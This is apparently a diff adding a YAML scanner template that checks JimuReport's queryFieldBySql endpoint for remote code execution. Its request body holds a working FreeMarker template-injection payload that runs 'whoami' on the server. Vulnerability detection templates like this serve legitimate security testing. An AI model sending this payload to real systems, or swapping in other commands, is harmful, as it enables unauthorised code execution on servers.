@@ -1,0 +1,26 @@
+id: poc-yaml-jimureport-queryfieldbysql-rce
+info:
+  name: Jimu Report queryFieldBySql SSTI RCE Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: sqli,rce
+http:
+  - method: POST
+    path:
+      - "/jmreport/queryFieldBySql"
+      - "/jeecg-boot/jmreport/queryFieldBySql"
+    headers:
+      Content-Type: application/json;charset=UTF-8
+    body: |-
+      {"sql":"select 'result:<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ex(\"whoami\") }'","dbSource":"","type":"0"}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "解析成功"
+          - "fieldName"
+          - "fieldText"
